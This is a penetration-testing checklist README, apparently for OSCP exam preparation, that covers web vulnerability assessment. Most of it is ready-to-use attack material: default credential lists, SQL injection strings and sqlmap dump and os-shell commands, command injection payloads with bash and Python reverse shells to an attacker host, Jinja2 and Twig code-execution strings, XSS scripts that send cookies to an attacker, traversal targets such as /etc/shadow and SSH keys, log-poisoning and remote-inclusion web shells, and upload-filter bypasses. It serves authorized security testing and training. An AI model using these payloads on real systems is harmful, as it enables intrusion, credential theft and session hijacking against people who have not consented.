# 🎭 Phase 3 — Vulnerability Assessment

> **Finding vulnerabilities before you exploit them.** A structured approach prevents wasted time on dead ends.

---

## Table of Contents
- [Automated Scanning](#automated-scanning)
- [Web Application Testing](#web-application-testing)
- [Authentication Testing](#authentication-testing)
- [Injection Attacks](#injection-attacks)
- [File Inclusion & Directory Traversal](#file-inclusion--directory-traversal)
- [File Upload Vulnerabilities](#file-upload-vulnerabilities)
- [Business Logic Flaws](#business-logic-flaws)
- [CMS-Specific Testing](#cms-specific-testing)

---

## Automated Scanning

- [ ] **Nmap vulnerability scripts**:
  ```bash
  nmap --script vuln -p <ports> $IP -oN nmap/vuln.txt
  ```
- [ ] **Nuclei** (template-based, fast, accurate):
  ```bash
  nuclei -u http://$IP -tags cve,misconfig,exposure -o nuclei_results.txt
  ```
- [ ] **Nikto** (web server scanner):
  ```bash
  nikto -h http://$IP -o nikto.txt
  ```

> **⚠️ OSCP Note:** Use automated scanners for initial discovery only. Verify every finding manually.

---

## Web Application Testing

### Methodology Order

1. Identify all input points (forms, URL params, headers, cookies)
2. Test for auth bypass / default credentials
3. Test each input for injection (SQLi, XSS, SSTI, CMDi)
4. Check for file inclusion/traversal
5. Test file upload if functionality exists
6. Check for IDOR / broken access control
7. Look for SSRF / XXE if there's URL/XML input

---

## Authentication Testing

- [ ] **Default credentials** (always try first):
  ```
  admin:admin      admin:password    admin:admin123
  root:root        root:toor         admin:
  test:test        guest:guest       administrator:password
  
  # Service-specific:
  Tomcat:  tomcat:tomcat, admin:admin
  Jenkins: admin:admin
  Grafana: admin:admin
  GitLab:  root:5iveL!fe (older)
  ```
- [ ] **Username enumeration**: Does the app respond differently for valid vs. invalid usernames?
- [ ] **Account lockout**: Test if accounts lock after N failed attempts (spray carefully if yes)
- [ ] **Password policy**: Try short/simple passwords — is there a minimum?
- [ ] **Session fixation**: Does the session ID change after login?
- [ ] **Weak session IDs**: Are cookies sequential or guessable?
- [ ] **JWT token attacks** (if JWT cookies found):
  ```bash
  # Decode JWT
  echo "<header>.<payload>" | base64 -d

  # Test for alg:none
  # Edit header to: {"alg":"none","typ":"JWT"}
  # Sign with empty signature
  
  # Test for weak secret
  hashcat -a 0 -m 16500 <jwt_token> /usr/share/wordlists/rockyou.txt
  ```
- [ ] **OAuth misconfigurations**:
  - Open redirect in redirect_uri
  - State parameter missing (CSRF)
  - Implicit flow token leakage

---

## Injection Attacks

### SQL Injection

- [ ] **Manual detection** (try in every input, URL param, cookie):
  ```sql
  '
  ''
  `
  ')
  '))
  ' OR '1'='1
  ' OR '1'='1'--
  ' OR '1'='1'/*
  1' ORDER BY 1--
  1' ORDER BY 2--    (increment until error = number of columns)
  ' UNION SELECT NULL--
  ' UNION SELECT NULL,NULL--
  ```
- [ ] **SQLMap** (automated, specify exact endpoint):
  ```bash
  # GET parameter
  sqlmap -u "http://$IP/page.php?id=1" --batch --dbs
  
  # POST parameter
  sqlmap -u "http://$IP/login" --data "user=admin&pass=test" --batch --dbs
  
  # Cookie-based
  sqlmap -u "http://$IP/page" --cookie "session=abc123" --batch --dbs
  
  # With Burp request file
  sqlmap -r request.txt --batch --dbs

  # Dump specific table
  sqlmap -u "http://$IP/page?id=1" --batch -D <db> -T <table> --dump
  
  # OS shell (if writable web dir)
  sqlmap -u "http://$IP/page?id=1" --os-shell
  ```
- [ ] **Blind SQLi manual**:
  ```sql
  ' AND (SELECT SUBSTRING(username,1,1) FROM users LIMIT 1)='a'--
  ' AND SLEEP(5)--         (time-based)
  ' AND IF(1=1,SLEEP(5),0)--
  ```

> **⚠️ OSCP Note:** SQLMap is restricted in OSCP exam. Learn manual SQLi testing.

### Command Injection

- [ ] **Basic payloads** (try after normal input):
  ```bash
  ; id
  && whoami
  | id
  `id`
  $(id)
  ; ls /
  %0a id        # URL-encoded newline
  ```
- [ ] **Blind command injection** (no output shown):
  ```bash
  ; ping -c 1 <attacker_ip>        # Check for ICMP
  ; curl http://<attacker_ip>/test  # HTTP callback
  ; sleep 5                          # Time-based
  ```
- [ ] **Advanced — trigger reverse shell**:
  ```bash
  ; bash -i >& /dev/tcp/<attacker_ip>/4444 0>&1
  ; python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("<attacker>",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
  ```

### Server-Side Template Injection (SSTI)

- [ ] **Detection payloads** (try in any field that reflects input):
  ```
  {{7*7}}          → 49 (Jinja2/Twig)
  ${7*7}           → 49 (Freemarker/Thymeleaf)
  #{7*7}           → 49 (Velocity)
  <%= 7*7 %>       → 49 (ERB/EJS)
  {{7*'7'}}        → 7777777 (Jinja2)
  ```
- [ ] **Jinja2 RCE** (Python/Flask):
  ```python
  {{config.__class__.__init__.__globals__['os'].popen('id').read()}}
  {{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
  ```
- [ ] **Twig RCE** (PHP):
  ```
  {{['id']|filter('system')}}
  {{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}
  ```

### XSS (Cross-Site Scripting)

- [ ] **Basic detection**:
  ```html
  <script>alert(1)</script>
  <img src=x onerror=alert(1)>
  <svg onload=alert(1)>
  "><script>alert(1)</script>
  '><script>alert(1)</script>
  ```
- [ ] **Cookie stealing** (Reflected/Stored XSS → session hijack):
  ```html
  <script>document.location='http://<attacker>/steal?c='+document.cookie</script>
  <script>new Image().src='http://<attacker>/steal?c='+document.cookie</script>
  ```

---

## File Inclusion & Directory Traversal

### Path Traversal

- [ ] **Basic payloads**:
  ```
  ../../../etc/passwd
  ../../../../windows/system32/drivers/etc/hosts
  ..%2F..%2F..%2Fetc%2Fpasswd     (URL encoded)
  ..%252F..%252Fetc%252Fpasswd    (double encoded)
  ....//....//etc/passwd           (filter bypass)
  ```
- [ ] **Common files to target**:
  ```
  # Linux
  /etc/passwd
  /etc/shadow   (needs root)
  /etc/hosts
  /proc/self/environ
  /home/<user>/.ssh/id_rsa
  /var/log/apache2/access.log  (log poisoning)
  
  # Windows
  C:\Windows\System32\drivers\etc\hosts
  C:\inetpub\wwwroot\web.config
  C:\Windows\win.ini
  C:\Users\Administrator\Desktop\root.txt
  ```

### Local File Inclusion (LFI)

- [ ] **Basic LFI**:
  ```
  ?page=../../../../etc/passwd
  ?file=../../etc/passwd
  ?include=../../../etc/passwd
  ```
- [ ] **PHP wrappers**:
  ```
  ?page=php://filter/read=convert.base64-encode/resource=index.php
  ?page=php://filter/read=convert.base64-encode/resource=config.php
  ?page=expect://whoami
  ?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+
  ```
- [ ] **Log poisoning** (LFI to RCE):
  ```bash
  # 1. Poison the log (inject PHP into User-Agent)
  curl -s http://$IP/ -A "<?php system(\$_GET['cmd']); ?>"
  
  # 2. Include the log
  curl "http://$IP/page.php?file=/var/log/apache2/access.log&cmd=id"
  ```

### Remote File Inclusion (RFI)

- [ ] **Host malicious file on attacker**:
  ```bash
  # Attacker machine:
  echo '<?php system($_GET["cmd"]); ?>' > shell.php
  python3 -m http.server 80
  
  # Target URL:
  ?page=http://<attacker_ip>/shell.php&cmd=id
  ```

---

## File Upload Vulnerabilities

- [ ] **Test for unrestricted upload** — upload a `.php` file
- [ ] **Bypass techniques**:
  ```
  Change extension:    shell.php → shell.php5, shell.phtml, shell.pHp
  Double extension:    shell.php.jpg, shell.jpg.php
  Null byte:           shell.php%00.jpg (PHP < 5.3)
  Change content-type: Change "image/jpeg" → keep .php
  Magic bytes:         Prepend GIF89a; to PHP file
  ```.htaccess trick```:
    Upload .htaccess with: AddType application/x-httpd-php .jpg
    Then upload shell.jpg
  ```
- [ ] **After upload, find where the file is**:
  - Check response for path
  - Try common upload directories: `/uploads/`, `/files/`, `/images/`, `/media/`
  - Try directly: `http://$IP/uploads/shell.php`

---

## Business Logic Flaws

- [ ] **IDOR (Insecure Direct Object Reference)**:
  - Change numeric IDs in URLs: `/profile?id=1` → `/profile?id=2`
  - Change UUIDs in requests if you can guess format
  - Try accessing other users' data via API: `/api/users/2`
- [ ] **Privilege escalation via parameter**:
  - `role=user` → change to `role=admin`
  - `isAdmin=false` → `isAdmin=true`
- [ ] **Mass assignment** (REST APIs):
  - Add unexpected fields to POST/PUT body: `{"name":"test","isAdmin":true}`
- [ ] **Price manipulation**: Change price to 0 or negative in cart
- [ ] **Race conditions**: Send concurrent requests to exploit TOCTOU
- [ ] **Step skipping**: In multi-step processes, jump directly to final step

---

## CMS-Specific Testing

### WordPress

- [ ] **WPScan — full scan**:
  ```bash
  wpscan --url http://$IP --enumerate u,p,t --api-token <token> -o wpscan.txt
  ```
- [ ] **WPScan — password brute force**:
  ```bash
  wpscan --url http://$IP --passwords /usr/share/wordlists/rockyou.txt --usernames admin
  ```
- [ ] **Manual checks**:
  ```
  /wp-login.php       ← login page
  /wp-admin/          ← admin panel
  /xmlrpc.php         ← XML-RPC (brute force / exploit)
  /?author=1          ← user enumeration
  /wp-content/plugins/ ← installed plugins (look for known vulns)
  ```
- [ ] **Admin → RCE**:
  - Appearance → Theme Editor → Edit `404.php` with PHP webshell
  - Plugins → Add Plugin → Upload malicious plugin zip

### Joomla

- [ ] **JoomScan**:
  ```bash
  joomscan -u http://$IP
  ```
- [ ] **Manual**:
  ```
  /administrator/     ← admin login
  /configuration.php  ← may be readable
  ```

### Drupal

- [ ] **Droopescan**:
  ```bash
  droopescan scan drupal -u http://$IP
  ```
- [ ] **Drupalgeddon2** (CVE-2018-7600) — critical RCE:
  ```bash
  # Check version first; Drupal < 7.58 or 8.x < 8.5.1
  python3 drupalgeddon2.py http://$IP
  ```

---

## 🔗 References

- [HackTricks — Web Security](https://book.hacktricks.xyz/pentesting-web)
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
- [PortSwigger Web Academy](https://portswigger.net/web-security) — best free web security labs
- [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)

---

*[← Recon & Enum](../02_recon_and_enum/README.md) · [Back to Main](../README.md) · [Exploitation →](../04_exploitation/README.md)*
